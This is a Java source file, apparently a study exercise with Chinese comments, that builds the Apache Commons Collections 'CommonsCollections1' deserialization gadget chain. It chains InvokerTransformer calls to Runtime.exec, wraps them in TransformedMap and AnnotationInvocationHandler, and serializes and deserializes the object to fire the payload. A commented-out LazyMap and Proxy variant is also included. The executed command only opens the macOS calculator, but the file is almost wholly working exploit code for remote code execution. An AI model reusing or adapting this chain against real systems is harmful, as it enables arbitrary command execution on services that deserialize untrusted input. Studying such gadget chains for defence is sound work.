package org.shear1n;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

/*
* Gadgets chain
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
				    //AnnotationInvocationHandler.invoke()
						TransformedMap.setValue()   //LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()

* */

public class CommonsCollections1 {
    public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException {

        //直接执行exec
//        Runtime.getRuntime().exec("open /System/Applications/Calculator.app");

        //反射调用
//        Runtime r = Runtime.getRuntime();
//        Class c = r.getClass();
//        Method execMethod = c.getMethod("exec",String.class);
//        execMethod.invoke(r,"open /System/Applications/Calculator.app");
//        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /System/Applications/Calculator.app"}).transform(r);


        //Runtime没有继承序列化接口，不能直接进行序列化，这里需要利用反射，通过Class来利用
//        Class c = Runtime.class;    //Class继承了序列化接口
//        Method getRuntimeMethod = c.getMethod("getRuntime",null); //获取geyRuntime方法
//        Runtime r = (Runtime) getRuntimeMethod.invoke(null,null);         //调用Runtime
//        Method execMethod = c.getMethod("exec",String.class);                   //获取exec方法
//        execMethod.invoke(r,"open /System/Applications/Calculator.app");

        //利用InvokerTransformer实现任意方法调用
//        Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
//        Runtime r = (Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntimeMethod);
//        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /System/Applications/Calculator.app"}).transform(r);

        //寻找InvokerTransformer实现方法，通过TransformedMap.decorate
////        Runtime r = Runtime.getRuntime();
//        Runtime r = Runtime.getRuntime();
//        Class runtime = Runtime.class;
//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /System/Applications/Calculator.app"});
////        invokerTransformer.transform(r);
//

//        Transformer类递归调用,用到ChainedTransformer
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /System/Applications/Calculator.app"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        chainedTransformer.transform(Runtime.class);



        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","aaa");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);

//        for(Map.Entry entry:transformedMap.entrySet()){
//            entry.setValue(r);
//        }

        //反射获取AnnotationInvocationHandler
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);//这里需要用getDeclaredConstructor来获取构造函数
        declaredConstructor.setAccessible(true);    //设置可访问
        Object obj = declaredConstructor.newInstance(Target.class,transformedMap);    //实例化

        serializable(obj);
        unserializable("ser.bin");

        /*
        LazyMap链子使用

        Transformer Transformer = new ChainedTransformer(transformers);

        HashMap<Object,Object> map = new HashMap();
        Map lazymap = LazyMap.decorate(map,Transformer);

        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor declaredConstructor = cl.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Target.class,lazymap);

        //LazyMap需要用到对象代理,从而获取到AnnotationInvocationHandler#invoke，执行里面的get方法
        Map proxMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},invocationHandler);
        //代理后的对象为proxyMap，这里并不能直接对其序列化，因为入口类是sun.reflect.annotation.AnnotationInvocationHandler#readObject
        // 需要AnnotationInvocationHandler对这个proxyMap进行包裹：

        InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Target.class,proxMap);

        serializable(handler);
        unserializable("ser.bin");

        */


    }

    //重写序列化
    public static void serializable(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    //重写反序列化
    public static Object unserializable(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream oos = new ObjectInputStream(new FileInputStream(filename));
        Object obj = oos.readObject();
        return obj;
    }
}